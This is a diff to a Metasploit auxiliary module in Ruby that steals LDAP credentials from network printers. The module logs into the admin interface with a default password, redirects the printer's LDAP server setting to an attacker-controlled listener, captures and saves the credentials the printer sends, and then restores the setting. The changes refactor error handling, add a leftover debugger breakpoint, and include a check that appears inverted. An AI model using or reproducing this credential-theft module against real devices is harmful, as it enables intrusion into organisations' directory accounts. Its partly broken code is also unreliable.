@@ -35,18 +35,29 @@ class Metasploit3 < Msf::Auxiliary
         OptString.new('PASSWORD', [true, "Password to access administrative interface. Defaults to 1111", '1111']),
         OptInt.new('RPORT', [ true, "The target port", 80]),
         OptInt.new('TIMEOUT', [true, 'Timeout for printer probe', 20]),
-        OptInt.new('TCPDELAY', [true, 'Number of seconds the tcp server will wait before termination'])
+        OptInt.new('TCPDELAY', [true, 'Number of seconds the tcp server will wait before termination', 20])
       ], self.class)
   end
 
 
   def run_host(ip)
-    print_status("Attempting to LDAP username and password for the host at #{rhost}")
-    login
-    get_ldap_server_info
-    update_ldap_server    
-    start_listener
-    restore_ldap_server
+    print_status("Attempting to extract LDAP username and password for the host at #{rhost}")
+    status = login
+    binding.pry
+    return unless status
+
+    status = get_ldap_server_info
+    return unless status
+    
+    status = update_ldap_server    
+    return unless status
+    
+    status = start_listener
+    return unless status
+
+    status = restore_ldap_server
+    return unless status
+    
     #Woot we got creds so lets save them.
         	print_good( "Found the following creds were capured: #{$data}")
         	loot_name     = "ldap.cp.creds"
@@ -63,9 +74,9 @@ class Metasploit3 < Msf::Auxiliary
     login_post_data = "_fun_function=HTTP_Authenticate_fn&NextPage=%2Fproperties%2Fauthentication%2FluidLogin.php&webUsername=admin&webPassword=#{datastore['PASSWORD']}&frmaltDomain=default"
     method = "POST"
     res = make_request(login_page,method,login_cookie,login_post_data)
-     unless res.code == 200
+    if res.blank? || res.code != 200
       print_error("Failed to login on #{rhost}. Please check the password for the Administrator account ")
-      return :abort
+      return false
     end
   end
 
@@ -78,9 +89,9 @@ class Metasploit3 < Msf::Auxiliary
     html_body = ::Nokogiri::HTML(res.body)
     $ldap_server = html_body.xpath('/html/body/form/div[4]/div/table/tbody/tr/td[3]').text.split(':')[0]
     print_status("Found LDAP server: #{$ldap_server}")
-     unless res.code == 200
+     unless res.code == 200 || res.blank?
       print_error("Failed to get ldap data from #{rhost}.")
-      return :abort
+      return false
      end
   end
 
@@ -91,9 +102,9 @@ class Metasploit3 < Msf::Auxiliary
     method = "POST"
     print_status("Updating LDAP server: #{datastore['SRVHOST']}")
     res = make_request(ldap_update_page,method,ldap_update_cookie, ldap_update_post)
-    unless res.code == 200
+    if res.blank? || res.code != 200
       print_error("Failed to update ldap server. Please check the host: #{rhost} ")
-      return :abort
+      return false
     end
    end
 
@@ -141,9 +152,9 @@ class Metasploit3 < Msf::Auxiliary
     method = "POST"
     print_status("Restoring LDAP server: #{$ldap_server}")
     res = make_request(ldap_restore_page,method,ldap_restore_cookie, ldap_restore_post)
-    unless res.code == 200
+    if res.blank? || res.code != 200
       print_error("Failed to restore LDAP server: #{@ldap_server}. Please fix manually")
-      return :abort
+      return false
     end
    end
 
@@ -160,7 +171,7 @@ class Metasploit3 < Msf::Auxiliary
       return res
     rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout, ::Rex::ConnectionError, ::Errno::EPIPE
       print_error("#{rhost}:#{rport} - Connection failed.")
-      return :abort
+      return false
     end
   end    
 end
